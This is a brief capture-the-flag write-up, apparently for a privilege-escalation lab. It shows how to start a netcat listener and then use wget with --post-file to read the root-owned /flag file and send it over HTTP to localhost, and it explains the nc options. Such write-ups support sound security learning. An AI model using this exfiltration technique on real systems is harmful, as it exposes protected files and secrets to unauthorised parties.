## ✅ what i did  
-clicked start
-opened the terminal
-ran: 'nc -nlvp 8080'
-ran: 'wget --post-file=/flag http://localhost:8080'
-flag popped out in the first terminal

## 🧑🏾‍🏫 what this challenge teaches u
nc options:
-n -> no DNS lookups
-l -> listen, this means its in server mode
-v -> verbose, prints details
-p -> port
wget downloads files
in this case wget open flag as root, create a POST request and uses /flag content as body and sends it to localhost:8080
